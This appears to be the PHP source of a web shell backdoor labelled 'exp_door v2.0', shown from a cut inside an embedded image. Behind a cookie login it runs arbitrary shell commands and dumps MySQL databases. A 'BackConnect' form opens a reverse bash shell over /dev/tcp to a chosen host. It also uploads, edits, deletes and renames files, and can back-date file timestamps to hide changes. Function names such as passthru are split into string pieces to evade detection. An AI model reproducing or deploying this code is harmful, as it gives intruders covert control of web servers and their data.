cABKamps5MTEwQRRGe5z0/p82x7cJoKabZ5L3vfS/9fp/p6WnOnj3LgQMHTtBoXLwGIDC2cMtFwx4niBIKmkQWpiRpgZwqhlqgaIiUtJgd4wWOn++xEs1Rvvdtv4Dyz7va+h3dVPpOm67rjpumlqIo+L5PlsH29ja6LGCoEpY10jQXi9P89E//u/82t/91X3gpnPslA2AU9i1NVvBdEUmwEUSZ7WaTuSkZ07Y5sdbiztf/mwfe8M73v4aXkL1kntrhuu7VnjUIAkzTpN3OmJmZodfrsbCwwBt+6qf+Ey8xe0kAePLkF27r9jaR5Hw0yNJEbNPj+v0SSZiQxQK7r7/3c1TuPHENwH/Eer3epO/7CIJw9bUsy8jzHNM08byANE0lXoL2ksiBhiumYhqRCuBFMaIGkpyQ5RmFsoUTA5LZfykC+JLwwCRJVFVVsG0T13URBGEk7klHM2VdV7Ftu3kNwG9isadhSAqTtSr9OCaMUgzdRlFAVnJq4xL6pL19LYT/iRpQlmWCIEAkJklE8jynWBztjJRKJUzzWgh/U+uK63N6nDJo94jTiFSISLI+lpKgRl0q+MS5V7oG4Dexy5cv3xRFEaIokueQJCPu7xuzkdEOXGBdA/AfscHqkvHAH374HZWCgJBHaDLYxQqhr9EeCmz7HlqtysbZB95J8NjBawD+PXvve9/7Z61W63lVgYJtW+R5jueNHm8SBAGapnH58mWDODauAfj37K8+8r4fmSmEKCVIxJiaqSCFIfgRFd3Gd/uIhojuOqyd/OqbrgH4t+yXf/lX/ygMYWZm5vnNyVEH8g1N8zc0zt1uF1mW+epXv/rGawA+bxee++rCVz73sX913RQoUoqTpDiCQeQnyKJImgU43pBYKJAnBnF3iN2/tJ/Vv77zGoDAgw8++I5ms0mtNlLTB0FAGI62j76hvqpUTDY2Nq4quwaDAUsnTtz3Qw/g4PQjR/7qA7/1Szt1H9EsMYzB8TNSNAKpgUuJbiQh2Q00fYzNrSElRWfl7AVaiw+8Mz35oXf80AIYrj7XePe73/1Mvz+gUrEBnn/KR4Rt26OVhed3T3q9HocPH76qL9R1iXPnzpUeeuihn8t6zzV+6AD8v3/8wXcePHjD1okTJ7ArRRRJZXl5C78XMW1kNOQWEiq9XspwIDIc5KhKBnFAHKXYRpG4vUb7mb848qn/8ZYtLnzizT/wvfClS5ekxcXFux564HP/4c/v/+jrq9USc+NV6gWZsN+lUChgiAK1WkAYRui6zvp6lyiELO8zHA5pt3O0fMhYpUq9Xmdra5swWec33/OeT9zyxs7M/K4bHth98HszXP+uP8X3zIVlazgcNrqd9oSYxWkWurWpRm15Y3314HNPPf6JJx58kILoYuVb9HoB07uOst3r0Oq20XSJuSmbra0t+n2fer3Eq+44QKvV4sp6m0QssOnmlBvz0R0vu/vDN9965/++/o57H/+B8sD9u3Y4gAP8nRlu94FP7+h2u0/u27evOj9u9utaf2xxcXGHXp5YftNPvPlPhp5T6/Vbc/328g379u1T+/1BY3V1ldXVVQqFAqZpctOxVzyp1mZPGaXJM5NT81+XNc35gfPAbxral1eknfNzKd/nJlz7M4IfADrrGoA/xPb/BgD5k2R5kCuEewAAAABJRU5ErkJggg==" /></div>
        <div id="inner2"><p style="float:right;margin-block-end:3px;font-size:10px">exp_door v2.0</p></div>
</div>';
echo $home;
if (isset($_POST['submitBtn'])) {
    $actpath = isset($_POST['path']) ? $_POST['path'] : __DIR__;
    chdir($actpath);
} else {
    $actpath = isset($_GET['path']) ? $_GET['path'] : __DIR__;
    chdir($actpath);
}
$login = $_COOKIE['login'];
$pass = $_COOKIE['pass'];
if (check($login, $pass)) {
    $a1 = 'pas' . 'sth' . 'ru';
    $cwd = $_GET['path'];
    if (empty($cwd)) {
        $cwd = getcwd();
    }
    $uname = php_uname();
    $php = phpversion();
    $temp_file = sys_get_temp_dir();
    $df = disk_free_space("/");
    $dt = disk_total_space("/");
    $freeSpace = $df / 1048576;
    $freeUnit = 'Mb';
    if ($freeSpace >= 1024) {
        $freeSpace /= 1024;
        $freeUnit = 'Gb';
    }
    $totalSpace = $dt / 1048576;
    $totalUnit = 'Mb';
    if ($totalSpace >= 1024) {
        $totalSpace /= 1024;
        $totalUnit = 'Gb';
    }
    $freePer = round($df / $dt * 100.0, 2);
    if ($freePer > 100) $freePer = 100;
    echo '<pre>';
    echo 'id    | ';
    echo $a1("id");
    echo 'uname | ' . $uname . '<br>';
    echo 'tmp   | ' . $temp_file . ' ' . substr(sprintf('%o', fileperms($temp_file)), -4) . '<br>';
    echo 'php   | ' . $php . '<br>';
    echo 'server| ' . $_SERVER['SERVER_NAME'] . ' ' . $_SERVER["SERVER_ADDR"] . ' ' . $_SERVER['SERVER_SOFTWARE'] . '<br>';
    echo 'client| ' . $_SERVER["REMOTE_ADDR"] . ' ' . $_SERVER[HTTP_ACCEPT_LANGUAGE] . '<br>';
    echo 'date  | ' . date("Y-m-d-H:i:s e P") . ' GMT' . '<br>';
    echo 'HDD   | ' . "Total: " . round($totalSpace, 2) . " " . $totalUnit . " ";
    echo "Free: " . round($freeSpace, 2) . " " . $freeUnit . "(" . $freePer . "%)" . '<br>';
    echo 'cwd   | ' . $cwd . ' ' . "[" . numPerms($actpath) . "] " . printPerms($actpath) . '<hr>';
    echo '</pre>';
    echo '</div>';
    function showContent($path)
    {
        if ($handle = opendir($path)) {
            $up = substr($path, 0, (strrpos(dirname($path . "/."), "/")));
            if ($up == NULL) {
                $up = "/";
            }
            $HTML = '
<div class="new">
         <label class="demos" style="display:inline-block"><a class="demolink" href="#tools">Tools</a></label> </td>
         <form style="display:inline;float:right" method="POST">
     <input style="margin-right: 5px;" type="submit" name="exit" value="EXIT"/>
     </form>
</div>
<div class="open">
<div>
<hr>
<form action="" style="display:inline" method="POST">
    <a class="hide" href="">Hide tools</a>
    <input type="submit" name="info" value="phpinfo"/> 
    <input type="submit" name="down" value="downloaders"/>
    <input type="submit" name="fun" value="functions"/>
</form>
<form style="display:inline" method="POST">
<input type="text" name="cmd" placeholder="CMD">
</form>
<hr>
<div style="float:left;margin-right:12px;">
<form method="POST">
<input style="width:178px" type="text" name="name" placeholder="DB name" required><br/>
<input style="width:178px" type="text" name="user" placeholder="DB user" required><br/>
<input style="width:178px" type="password" name="pass" placeholder="DB pass" required><br/>
<input style="width:178px" type="text" name="host" placeholder="MySQL host" required><br/>
<input style="width:178px" type="text" name="port" placeholder="Port"><br/>
<button style="width:196px" type="submit" name="DB">Save DB to file.sql</button><br/><br/><br/>
</form>
</div>
<div style="float: left;display:block;width:208px">
<pre>
<form method="POST">
<label><b class="bt">Base64 encode/decode:</b></label>
<input style="width:178px" type="text" name="base64">
<table class="ya">
<tr>
<td style="padding: 0;border: none"><input style="margin-left: -1px;width: 96px;" type="submit" name="submit" value="Encode"></td>
<td style="padding: 0;border: none"><input style="margin-right: 8px;width: 96px;" type="submit" name="submit2" value="Decode"></td>
</tr>
</table>
</form>
</pre>
</div>
<div style="float: left;display:block;width:208px">
<pre>
<form  method="POST">
<label><b class="bt">URL encode/decode:</b></label>
<input style="width:178px" type="text" name="url">
<table class="ya">
<tr>
<td style="padding: 0;border: none"><input style="margin-left: -1px;width: 96px;" type="submit" name="submit_u" value="Encode"></td>
<td style="padding: 0;border: none"><input style="margin-right: 8px;width: 96px;" type="submit" name="submit_u2" value="Decode"></td>
</tr>
</table>
</form>
</pre>
</div>
<div style="float: left;display:block;width:208px">
<pre>
<form  method="POST">
<label><b class="bt">HEX encode/decode:</b></label>
<input style="width:178px" type="text" name="hex">
<table class="ya">
<tr>
<td style="padding: 0;border: none"><input style="margin-left: -1px;width: 96px;" type="submit" name="submit_hex" value="Encode"></td>
<td style="padding: 0;border: none"><input style="margin-right: 8px;width: 96px;" type="submit" name="submit_hex2" value="Decode"></td>
</tr>
</table> 
</form>
</pre>
</div>
<div style="float: left;display:block;width:208px">
<pre>
<form  method="POST">
<label><b class="bt">BackConnect:</b></label>
<input style="width:178px" type="text" name="host_" placeholder="Enter host|port" required>
<table class="ya">
<tr>
<td style="padding: 0;border: none"><input style="margin-left: -1px;width: 96px;" type="submit" name="reverse" value="Reverse"></td>
</tr>
</table>
</form>
</pre>
</div>
<hr style="clear:both">
</div>';
            echo $HTML;
            $a1 = 'pas' . 'sth' . 'ru';
            $b2 = 'ex' . 'ec';
            $down = "which get;which wget;which lynx;which curl;which fetch;which links;";
            $aTwo = "ba" . "se" . "6" . "4" . "_" . "en" . "co" . "de";
            $bTwo = "ba" . "se" . "6" . "4" . "_" . "de" . "co" . "de";
            $fun = $bTwo("cGhwIC1yICdwcmludF9yKGdldF9kZWZpbmVkX2Z1bmN0aW9ucygpKTsnIHwgZ3JlcCAtRSAnIChzeXN0ZW18ZXhlY3xzaGVsbF9leGVjfHBhc3N0aHJ1fHByb2Nfb3Blbnxwb3BlbnxjdXJsX2V4ZWN8Y3VybF9tdWx0aV9leGVjfHBhcnNlX2luaV9maWxlfHNob3dfc291cmNlKSc");
            if (isset($_POST['cmd'])) {
                echo '<pre>';
                $a1($_POST['cmd']);
                echo '</pre>';
            }
            if (isset($_POST['info'])) {
                echo phpinfo();
            }
            if (isset($_POST['down'])) {
                echo '<textarea cols=37 rows=7 style="padding: 5px;resize: none;">';
                $a1($down);
                echo '</textarea>';
            }
            if (isset($_POST['fun'])) {
                echo '<pre>';
                $a1($fun);
                echo '</pre>';
            }
            if (isset($_POST['DB'])) {
                $host = $_POST['host'];
                $user = $_POST['user'];
                $pass = $_POST['pass'];
                $name = $_POST['name'];
                $port = $_POST['port'];
                $link = new mysqli($host, $user, $pass, $name, $port);
                if ($link->connect_error) {
                    die("<b class='pm'>Database access is not available:</b><br>" . $link->connect_error);
                    exit();
                } else {
                    $b2('mysqldump --port=' . $port . ' --user=' . $user . ' --password=' . $pass . ' --host=' . $host . ' ' . $name . ' > file.sql');
                    echo '<b class="bt" style="font-size: 14px">Dump completed!</b>';
                }
            }
            if (isset($_POST['submit'])) {
                $base64 = $_POST['base64'];
                $encode = $aTwo($base64);
                echo '<p class="pm">' . "Encode base64: " . '</p>' . $encode;
            }
            if (isset($_POST['submit2'])) {
                $base64_d = $_POST['base64'];
                $decode = $bTwo($base64_d);
                echo '<p class="pm">' . "Decode base64: " . '</p>' . htmlentities($decode);
            }
            if (isset($_POST['submit_u'])) {
                $url = $_POST['url'];
                $encode_u = urlencode($url);
                echo '<p class="pm">' . "Encode url: " . '</p>' . $encode_u;
            }
            if (isset($_POST['submit_u2'])) {
                $url_d = $_POST['url'];
                $decode_u = urldecode($url_d);
                echo '<p class="pm">' . "Decode url: " . '</p>' . htmlentities($decode_u);
            }
            if (isset($_POST['submit_hex'])) {
                $h = $_POST['hex'];
                $encode_hex = "0x" . bin2hex($h);
                echo '<p class="pm">' . "Encode HEX: " . '</p>' . $encode_hex;
            }
            if (isset($_POST['submit_hex2'])) {
                $h2 = $_POST['hex'];
                $decode_hex = hex2bin(substr($h2, 2));
                echo '<p class="pm">' . "Decode HEX: " . '</p>' . htmlentities($decode_hex);
            }
            if (isset($_POST['reverse'])) {
                $back = explode("|", $_POST['host_']);
                $a1("bash -c 'bash -i &> /dev/tcp/$back[0]/$back[1] 0>&1'");
            }
            $HTML2 = '</div>
<div id="tools" class="to-be-changed">
            <form class="all" id ="tab" action="' . $_SERVER['PHP_SELF'] . '" method="post" name="path">
               <table class="to">
                  <tr>
                     <td><a href="' . $_SERVER['PHP_SELF'] . '?path=' . __DIR__ . '"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAIGNIUk0AAHolAACAgwAA+f8AAIDoAABSCAABFVgAADqXAAAXb9daH5AAAAKjSURBVHja7JfPaxNREMe/s/uiSUOaRVopJZ701rOgPbVQK1g8eSmIf4GgBQ96UdCC6E3Bg39Bi/UmeGnVeohpUQSRiqCeREOREtIkbZLu7hsP26Qv6b7NJo3kYAfmsPtedj4zb368EDOjl2Kgx3II0HMAoT5k01dGE7HqS5auFfQjBvKOjE4NnJnLdGJUTfwGAFnNTeywbakbNFVigYoTADJdjYBtlykaMSGlBLPcA5PS5/COjG+sXKLamh8oEXlbDQNghmGKzReL358CqPgCMEtISXBdB67r6o17uGPVcnGsZZIZXpoJIWCaAlPjKQB4pAFguK6D2KlbSKQm6x4cVKSUKP5aRPnHA5C9ldRWQS2M3TRei0L/ifOQUsJxbH0O5PIl9A3Fwb+fwFVC32m7Vp0gIoAYm4UyhnUAIyfjiMdMIPc8ZD05TRaFfg8JpAYJtkX6CBwVVQB94Q02Gw5aZwcggYgIAAj8iGrIz1PVkC467ABoBaDznESjAljKZEEETJxVTlVWgp0IakShPN/V1c953H68BgBIJi2cHun3DBtRDyJkjoQfRorxj1+3ceN+BqYBmAYwM5vGp28V/dF0cxq+Xyvg2t23MAw06NU7b/DhS+HfAixlspiZTYMIMJqUCLh+L41XK9nWyawDaNX9zo0OK92tUWvSkJBqEqsaGIEQ51jjXJ6fxvL8dMO7A41j33puApMMGAyoQ1JKgNlba8eRfQBev97rWvobDeC4ANgb2Y7bRhSb1sS+2V0rN00EVhcu7D6b9Xp/9+xiHaYVfCAAKOJvXP2wrtWGnhmsB9jYSpYGkuR5xwIdi18EyARIoFjaLiXU1+qsTw1Fj12eTNw8PmhZLFtdydq/lKz/yecXXpce/lzfyfkCHP4z+i8B/g4A/9UanjCKwiYAAAAASUVORK5CYII=" title="Home"/></a></td>
                     ' . "<td class='col'>&#9650; <a href='" . $_SERVER['PHP_SELF'] . "?path=$up'>Up one level</a></td>" . '
                     <td><a href="' . $_SERVER['HTTP_REFERER'] . '"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDoAABSCAABFVgAADqXAAAXb9daH5AAAANJSURBVHja7NVLbxtVHAXwEyRgxSKsIHFci3g8nhnP2/Ow0yR+NLE9Gc8jCQ5OxkmaJm3Io1CpQaISpDQERSgoKtRFwY3bJZ8AdVupH4EVZYEEEiB1QRfdgNTLYvpKqWhpQAKJxdld3Z/OvX/dC0II/sngf+DfBfCTIvhJEdKMDLEhg5vgwdV4CIEE2mFekmbkZuoN4U2uxoOb4JH0WYgNGfJRBcqxNJgxFkIggRnlEC8nEC8nngDUeLDjHFJ1oVNbMi4XN48QbcnYSi/qUE9oYF9PPTsgBBLEhgyxIQvZtcPX7ItVYn02QvQVY11fNg8OpOoC5Dk1lz9buFHddYjX9slI0ybZ04fPmW9nocynO5hRDsKU9BeBugghkKAuaPOFzSO3nJZH3D2PuJc84rRcMrxd/mngzOB1863sl+KM/I48q5hCIL34VIAQSBAC6WV91Txf+qRMnEsPNn84Tssl1S8cYjerZGhr+HbmVPYreU4dZnzuzwF5Tl0zTmaujlywidt+/ObuPXTPI96eT7y2T5yWS4ofDf2qzKc3uQn+hYMDjwG9tk8q5y2SXtSbtMMc7Ii8RxrcW+Pt+aSyYxGxIZ/qHaae7ZJL2+Wfc2fzN/IbxZtDH5d+K+9U7lR3HeK2wxZe2yf5Dwo/MqOcRFn0U43pt+GYesT+vEqMVXMjXkk8F7cSrzDjKUU+ps4aq+blwfdz31mfWnf8tk+quw5RF7XmHxvUwwbSUQXitAxpVoE0rQh9a/3X7ItVMnLBJvqysZ70WPSWKDDjKSgLaVA2Da7GR/QV40xho3jTabmkcK74Q7ySiO8HpsIGvWUKsfxriA7EQDsMUnWhU18OnwpjxdxSj2tgfA7sXYB2GQiBBHlOBTPGqoPv5b4u71QIPykG+4Ce7CH0ZA+h2+y5ny49guhADEmXfZ6fEt9NumyddpJI2DRol7kP8FMi1AUNlEWDGeXSufX8L8bJzJV9QCQTfTQdXVqkI9ofQ9JjkaoLIapF8KrajWh/DOoJDbQTNlCOp5GwaVAWDXVR+zB7uu+bJwHo0iJ4GIhkoug2QiQ6cBdwGXA1HtKs/OAep5U+bUn//m8DeksUKIsGZYeJVxKdzBi3/d//Mn8fAHPpK2jpQ02eAAAAAElFTkSuQmCC" title="Go back"/></a></td>
                     <td>Path: <input style="border: 1px solid #cccccc;width: 250px;" name="path" type="text" value="' . getcwd() . '" />
                        <input style="border: 1px solid #cccccc;" type="submit" name="submitBtn" value="Go dir" />
                     </td>
                  </tr>
               </table>
            </form>';
            echo $HTML2 . "<div class='all' id='result'><form method='post' action='#openModal'><table id='firsttab'>";
            echo "<tr style = 'background-color: #73afe4;color: #0E175D;height: 24px;'><td></td>" . "<td>" . "Name" . "</td>" . "<td>" . "Action" . "</td>" . "<td>" . "Permissions" . "</td>" . "<td>" . "Owner/Group" . "</td>" . "<td>" . "Modify" . "</td>" . "<td>" . "Size" . "</td></tr>";
            $alldir = array();
            $allfile = array();
            $alllink = array();
            while (false !== ($file = readdir($handle))) {
                if (is_link($path . '/' . $file)) {
                    array_push($alllink, $file);
                } elseif (is_file($path . '/' . $file)) {
                    array_push($allfile, $file);
                } elseif (is_dir($path . '/' . $file)) {
                    array_push($alldir, $file);
                }
            }
            closedir($handle);
        } else {
            echo '<div><span class="error">Can\'t open folder!<br><br><a class="a_size" href="' . $_SERVER['HTTP_REFERER'] . '">--> Go back <--</a></span></div>';
        }
        sort($alldir);
        sort($allfile);
        sort($alllink);
        $allfiles = array_merge($alldir, $allfile, $alllink);
        foreach ($allfiles as $file) {
            if ($file != "." && $file != "..") {
                $fName = $file;
                $userinfo = posix_getpwuid(fileowner($file)) ["name"] . "/" . posix_getgrgid(filegroup($file)) ["name"];
                if (strlen($path) == 1) {
                    $file = $path . $file;
                } else {
                    $file = $path . '/' . $file;
                }
                if (is_link($file)) {
                    $disppath = readlink($file);
                    if (strpos($disppath, "/") != 0) {
                        $disppath = "/" . $disppath;
                    }
                    if (is_file(readlink($file))) {
                        echo "<tr tabindex='0' class='note'><td class='cbox'>" . "<input type='checkbox' name='choose[]' value='$file'>" . "</td>" . "<td class='col'>&#10150;" . "<input class='openf all' type='submit' name='view' value=" . $fName . ">" . "</td>" . "<td>" . "<input style='border: 1px solid #cccccc;' name='del' value='D' type='submit' title='Delete'>" . "<input style='border: 1px solid #cccccc;' name='ren' value='R' type='submit' title='Rename'>" . "<input style='border: 1px solid #cccccc;' name='tou' value='T' type='submit' title='Touch'>" . "<td>" . "[" . numPerms($file) . "] " . printPerms($file) . "</td>" . "<td>" . $userinfo . "</td>" . "<td>" . date('d-m-Y H:i:s', filemtime($file)) . "</td>" . "<td>LINK</td></tr>";
                    } else {
                        echo "<tr tabindex='0' class='note'><td class='cbox'>" . "<input type='checkbox' name='choose[]' value='$file'>" . "</td>" . "<td class='col'>&#10150;<a href='" . $_SERVER['PHP_SELF'] . "?path=$disppath'>$fName</a> </td>" . "<td>" . "<input style='border: 1px solid #cccccc;' name='del' value='D' type='submit' title='Delete'>" . "<input style='border: 1px solid #cccccc;' name='ren' value='R' type='submit' title='Rename'>" . "<input style='border: 1px solid #cccccc;' name='tou' value='T' type='submit' title='Touch'>" . "<td>" . "[" . numPerms($file) . "] " . printPerms($file) . "</td>" . "<td>" . $userinfo . "</td>" . "<td>" . date('d-m-Y H:i:s', filemtime($file)) . "</td>" . "<td>LINK</td></tr>";
                    }
                } elseif (is_file($file)) {
                    $endsize = "";
                    $fullsize = filesize($file);
                    if ($fullsize < 1024) {
                        $endsize = "B";
                    } elseif ($fullsize < 1048576) {
                        $endsize = "KB";
                        $fullsize /= 1024;
                    } elseif ($fullsize < 1073741824) {
                        $endsize = "MB";
                        $fullsize /= 1048576;
                    }
                    echo "<tr tabindex='0' class='note'><td class='cbox'>" . "<input type='checkbox' name='choose[]' value='$file'>" . "</td>" . "<td class='col'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDoAABSCAABFVgAADqXAAAXb9daH5AAAAFgSURBVHjafJJBbtVAEETfOF8iipFyLlY5AKwQ2ygHQBHrZIMQCnCEZIVEJNacIuw5wk9ifkJ3FYux/ze2w0gtj9xTVd3VXWxj25dXP1it9lg6Nz9/8e70VVnKlYGgu3+gfb6/+Oji87UjxMnx0SzfDBdhJHkaYNvm5PiofLz45ojwIkFDoWmaMg0oBUCS37x+wacv37HtWQt39xvag2fzHkvh7PyKtt3HNgbW647Tty9rO3Yt/e72t3uyWWTKj4/hzeaPu+7B7z983b5dTT2YqmcaO4kAO8kEW9s3q6kHY4KItA0RxoZMkIRd5gTjCnbK6pXVg2sF2nm4XMFU+Z/ypeUWRJ3GVHkAD1/XzZgTUMo2OShL7nuuYAmUT3hAikwRkX3ZAxAyKzgz0VMehNwrDrsxHp97Eyt4hN8R2BApQiJD9R5JZhJhIkVm1umM1mW7yuvbbveT/x8bDg/bAvB3ANDOll1QTtuSAAAAAElFTkSuQmCC' /> " . "<input class='openf all' type='submit' name='view' value=" . $fName . ">" . "</td>" . "<td>" . "<input style='border: 1px solid #cccccc;' name='del' value='D' type='submit' title='Delete'>" . "<input style='border: 1px solid #cccccc;' name='ren' value='R' type='submit' title='Rename'>" . "<input style='border: 1px solid #cccccc;' name='tou' value='T' type='submit' title='Touch'>" . "<input style='border: 1px solid #cccccc;' name='edit' value='E' type='submit' title='Edit'>" . "<input style='border: 1px solid #cccccc;font-size: 14px;padding-left: 6px;padding-right: 6px;' name='load' value='&#11015;' type='submit' title='Download'>" . "</td>" . "<td>" . "[" . numPerms($file) . "] " . printPerms($file) . "<td>" . $userinfo . "</td>" . "<td>" . date('d-m-Y H:i:s', filemtime($file)) . "</td>" . "<td>" . round($fullsize, 2) . " " . $endsize . "</td></tr>";
                } elseif (is_dir($file)) {
                    echo "<tr tabindex='0' class='note'><td class='cbox'>" . "<input type='checkbox' name='choose[]' value='$file'>" . "</td>" . "<td class='col'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACX0lEQVR42mNkoBAwDh4DyjyEpBkZGTg7t7+7g6wg1V6AzVCBy4aDm503adr9jRgGlHoIyMRluKyT1VY0YWRmYji7/dSc84evzVJWETGS05L3FFWUcBaVE+P98/Pn/56y5TYNa14cQzFgXoF0Z1RlShkj2DH/gegfEP0F8v6B2Qz//8Lx3hXHJqzbcK1YXZJVV0qMXXvXhR8rGEPNueIWLotZyMwlgqKY4R8y+w/DxxdvGN48ev6Bg1/okZiyLMd/Fp5v3YWLYxml+RmFj6y0ey6lbcgKU4ww4A+Y/+zmAwYeUUEGHkmV//8ZWa4wM/3/dWXPuZPGCfuzwYG4rFbyZHCitxnMgH+/fzG8e/aW4ceXd0BPMTOIKskzcPAKAw38zfDn178H//78eb+0a1dCxqJXl8AGlPuzdNe3+ZYwMzExfP/0leHJnbsM0poaDJx8wsCwAIbLv99w/Ofn77ePb7w+oBF5KgQejV66zMFLphut4eYVYLh1/iaDipk5AxMTI1TTLwZGFAN+/Tyx61mpU/2TyXAD1ESYFPbMlbv//y8HA7cwNwOfEDBA//5GsRmG//35/X/apBcORWu+HIIbIMrNyLS5U+gtHzezgIquEjTwYJr+QAMWQj96+OtLQMU7+SvP/71DSYmz0tlO+3oLmwgL80E0/ofExr+/fxjevfn9/+y13/cPX/x1eOep33MuPv13BCMpt4WzrCpMFw1lAgbax/e//1+88fvpkUu/jhy59HvfhYf/Dnz++f/+r78Mf3DmBSMZJrMgW7bCk9f+HD13/+/+N1//3/yJRQM6AAA6UD7VkPGJ1gAAAABJRU5ErkJggg==' /> <a href='" . $_SERVER['PHP_SELF'] . "?path=$file'>$fName</a></td>" . "<td>" . "<input style='border: 1px solid #cccccc;' name='del' value='D' type='submit' title='Delete'>" . "<input style='border: 1px solid #cccccc;' name='ren' value='R' type='submit' title='Rename'>" . "<input style='border: 1px solid #cccccc;' name='tou' value='T' type='submit' title='Touch'>" . "<input style='border: 1px solid #cccccc;padding: 0 7px;' name='up' value='U' type='submit' title='Upload'>" . "</td>" . "<td>" . "[" . numPerms($file) . "] " . printPerms($file) . "<td>" . $userinfo . "</td>" . "<td>" . date('d-m-Y H:i:s', filemtime($file)) . "</td>" . "<td>DIR</td></tr>";
                }
            }
        }
        echo "</table></form></div></div>";
    }

    echo showContent($actpath);
    function removeDirectory($dir)
    {
        if ($objs = glob($dir . "/*")) {
            foreach ($objs as $obj) {
                is_dir($obj) ? removeDirectory($obj) : unlink($obj);
            }
        }
        return rmdir($dir);
    }

    $modal = '
<div id="openModal" class="modalbackground">
    <div class="modalwindow"> 
        <p>text</p>
        <a href="">Close</a>
    </div>
</div>';
    if (isset($_POST['del'])) {
        if (!empty($_POST['choose'])) {
            foreach ($_POST['choose'] as $value) {
                if (is_link($value)) {
                    if (unlink($value)) {
                        echo str_replace("text", '<p class="pm">' . "The link was successfully deleted!" . '</p>', $modal);
                    } else {
                        echo str_replace("text", '<p class="pm">' . "Error! The link was not deleted!" . '</p>', $modal);
                    }
                } elseif (is_file($value)) {
                    if (unlink($value)) {
                        echo str_replace("text", '<p class="pm">' . "The file was successfully deleted!" . '</p>', $modal);
                    } else {
                        echo str_replace("text", '<p class="pm">' . "Error! The file was not deleted!" . '</p>', $modal);
                    }
                } elseif (is_dir($value)) {
                    if (removeDirectory($value)) {
                        echo str_replace("text", '<p class="pm">' . "Directory deleted!" . '</p>', $modal);
                    } else {
                        echo str_replace("text", '<p class="pm">' . "Error! The directory was not deleted!" . '</p>', $modal);
                    }
                }
            }
        }
    }
    if (isset($_POST['edit'])) {
        if (!empty($_POST['choose'])) {
            $val = $_POST['choose'][0];
            if (is_readable($val)) {
                $formedit = "
<div id='openModal' class='modalbackground'><div class='modalwindow2'><form style='width: 96%;height: 85%;margin: 0 auto;' method='post'>
<textarea style='resize: none;width: 98%;height: 98%;' name='edit_code'>" . htmlspecialchars(file_get_contents($val)) . "</textarea><input type='hidden' name='correction' value='" . $_POST['choose'][0] . "'><input style='float:left;margin-left: 1%;margin-top: 8px;' type='submit' value='Apply the changes'></form><a href=''>Close</a></div></div>";
                echo $formedit;
            } else {
                echo str_replace("text", '<p class="pm">' . "Error! Can't open file!" . '</p>', $modal);
            }
        }
    }
    if (isset($_POST['edit_code'])) {
        $result = file_put_contents($_POST['correction'], $_POST['edit_code']);
        if ($result === FALSE) {
            echo str_replace("text", '<p class="pm">' . "Error writing to file!" . '</p>', $modal);
        } else {
            echo str_replace("text", '<p class="pm">' . "The file was successfully modified!" . '</p>', $modal);
        }
    }
    if (isset($_POST['view'])) {
        if (is_readable($_POST['view'])) {
            $doc = fopen($_POST['view'], "rt");
            $contents = '';
            while (!feof($doc)) $contents .= fread($doc, 4096);
            fclose($doc);
            if (filesize($_POST['view']) == 0) {
                echo str_replace("text", '<p class="pm">' . "The file is empty!" . '</p>', $modal);
            } elseif ($contents) {
                echo '<div id="openModal" class="modalbackground">' . '<div class="modalwindow2">' . "<div class='area'>";
                highlight_string($contents);
                echo "</div>" . '<a href="">Close</a>' . "</div>" . "</div>";
            }
        } else {
            echo str_replace("text", '<p class="pm">' . "Error! Can't open file!" . '</p>', $modal);
        }
    }
    if (isset($_POST['up']) && !empty($_POST['choose'])) {
        echo '<div id="openModal" class="modalbackground">' . '<div class="modalwindow">' . "<div style='width: auto;' class='area'>";
        echo '<p style="margin-left:5px;text-align: left;">' . "upload_max_filesize: " . ini_get("upload_max_filesize") . "<br>" . "post_max_size: " . ini_get("post_max_size") . '</p>';
        echo '
<pre>
<form method="POST" enctype="multipart/form-data">
<label><b class="bt">Uploader:</b></label>
<input type="file" name="filename" ><br/>
<input type="hidden" name="up_file" value="' . $_POST['choose'][0] . '">
<input type="submit" value="Upload">
</form>
<pre>';
        echo "</div>" . '<a href="">Close</a>' . "</div>" . "</div>";
    }
    if ($_FILES['filename']['error'] == UPLOAD_ERR_OK) {
        $name = $_POST['up_file'] . '/' . $_FILES['filename']['name'];
        if (move_uploaded_file($_FILES['filename']['tmp_name'], $name)) {
            $text = '<p class="pm">' . "The file was uploaded successfully!" . '</p>';
            $newphrase = str_replace("text", $text, $modal);
            echo $newphrase;
        }
    } else {
        echo str_replace("text", '<p class="pm">' . "Error! The file is not selected!" . '</p>', $modal);
    }
    if (isset($_POST['tou']) && !empty($_POST['choose'])) {
        echo '<div id="openModal" class="modalbackground">' . '<div class="modalwindow">' . "<div style='width: auto;' class='area'>";
        echo "
<form method='post'>
<textarea style='resize: none;' name='code'>" . date('d-m-Y H:i:s', filemtime($_POST['choose'][0])) . "</textarea>
<input type='hidden' name='date_file' value='" . $_POST['choose'][0] . "'><br/>
<input type='submit' value='Touch'>
</form>";
        echo "</div>" . '<a href="">Close</a>' . "</div>" . "</div>";
    }
    if (isset($_POST['code'])) {
        if (touch($_POST['date_file'], strtotime($_POST['code']))) {
            $text = '<p class="pm">' . "Modification date changed!" . '</p>';
            $newphrase = str_replace("text", $text, $modal);
            echo $newphrase;
        } else {
            echo str_replace("text", '<p class="pm">' . "Error! You couldn't change the date!" . '</p>', $modal);
        }
    }
    if (isset($_POST['ren']) && !empty($_POST['choose'])) {
        echo '<div id="openModal" class="modalbackground">' . '<div class="modalwindow">' . "<div style='width: auto;' class='area'>";
        echo "
<form method='post'>
<textarea style='resize: none;' name='r_code'>" . $_POST['choose'][0] . "</textarea>
<input type='hidden' name='ren_file' value='" . $_POST['choose'][0] . "'><br/>
<input type='submit' value='Rename'>
</form>";
        echo "</div>" . '<a href="">Close</a>' . "</div>" . "</div>";
    }
    if (isset($_POST['r_code'])) {
        if (rename($_POST['ren_file'], $_POST['r_code'])) {
            echo str_replace("text", '<p class="pm">' . "Renaming completed!" . '</p>', $modal);
        } else {
            echo str_replace("text", '<p class="pm">' . "Error! Not renamed!" . '</p>', $modal);
        }
    }
    echo '</div></div>';
} else echo showForm();
?>

</body>
</html>
